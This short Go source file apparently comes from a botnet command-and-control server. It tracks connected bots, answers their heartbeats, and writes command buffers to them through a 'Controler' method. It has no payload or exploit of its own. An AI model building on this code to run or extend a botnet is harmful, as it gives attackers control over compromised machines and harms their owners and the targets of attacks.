package main

import (
	"net"
	"time"
)

type Bot struct {
	uid      int
	conn     net.Conn
	version  byte
	powerful string
}

func NewBot(conn net.Conn, version byte, powerful string) *Bot {
	return &Bot{-1, conn, version, powerful}
}

func (bot *Bot) Handle() {

	clientList.AddClient(bot)
	defer clientList.DelClient(bot)

	heartbeat := Pack(HEARTBEAT, "\x00")

	sleep := time.Millisecond * time.Duration(1000)
	for {
		bot.conn.SetDeadline(time.Now().Add(180 * time.Second))
		pkt, err := ReadPacket(bot.conn)
		if err != nil {
			return
		}

		if pkt.Type == HEARTBEAT {
			err = WritePacket(bot.conn, heartbeat)
			if err != nil {
				return
			}
			time.Sleep(sleep)
		}
	}
}

func (bot *Bot) Controler(buf []byte) {
	sp.logger.Debug("send buf to bot:% X", buf[0:20])
	WritePacket(bot.conn, buf)
}
